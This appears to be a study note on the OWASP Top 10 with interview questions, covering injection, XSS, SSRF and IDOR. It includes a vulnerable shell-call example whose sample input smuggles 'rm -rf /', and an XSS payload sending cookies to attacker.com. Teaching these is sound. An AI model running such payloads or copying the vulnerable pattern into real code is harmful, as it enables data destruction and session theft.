# Day 58 - OWASP Top 10

## Goal
Learn the OWASP Top 10 - the industry-standard list of the most critical web application security risks, directly testable knowledge for any security role.

## 1. Injection (SQLi, Command Injection)
Untrusted input is interpreted as code/commands. SQL Injection covered in depth Topic 31. Command Injection: user input passed unsanitized into a system shell command.
```python
# Vulnerable
os.system("ping " + user_input)
# If user_input = "8.8.8.8; rm -rf /", both commands execute
```

## 2. Broken Authentication
Weak session management, predictable session tokens, missing account lockout, credential stuffing vulnerability.

## 3. XSS (Cross-Site Scripting)
Injecting malicious scripts into web pages viewed by other users.
- **Stored XSS**: payload saved on the server (e.g., in a comment), executes for every viewer
- **Reflected XSS**: payload in a URL parameter, executes immediately when clicked
- **DOM-based XSS**: payload executes via client-side JavaScript manipulation

```html
<script>document.location='http://attacker.com/steal?cookie='+document.cookie</script>
```

## 4. Security Misconfiguration
Default credentials left active, unnecessary services enabled, verbose error messages revealing system details, missing security headers.

## 5. SSRF, IDOR, etc.
- **SSRF (Server-Side Request Forgery)**: tricking a server into making requests to unintended locations (e.g., internal cloud metadata endpoints)
- **IDOR (Insecure Direct Object Reference)**: accessing another user's data by simply changing an ID in a URL/request (e.g., `/invoice?id=1001` to `/invoice?id=1002`)

## Interview Questions
**Q1. Difference between Stored and Reflected XSS?**
Stored XSS persists on the server and affects all viewers; Reflected XSS executes immediately from a crafted URL/request, affecting only that specific request's victim.
**Q2. What is IDOR?**
Accessing unauthorized data by manipulating a reference (like an ID) in a request, due to missing authorization checks.
**Q3. What is SSRF and why is it dangerous in cloud environments?**
Tricking a server into making requests on the attacker's behalf - dangerous in cloud environments because it can be used to reach internal metadata endpoints (e.g., AWS instance metadata) and steal credentials.

## Key Takeaways
- Learned Injection, Broken Authentication, XSS, Security Misconfiguration, SSRF, and IDOR
- Connected back to SQL Injection (Topic 31) within the broader OWASP framework
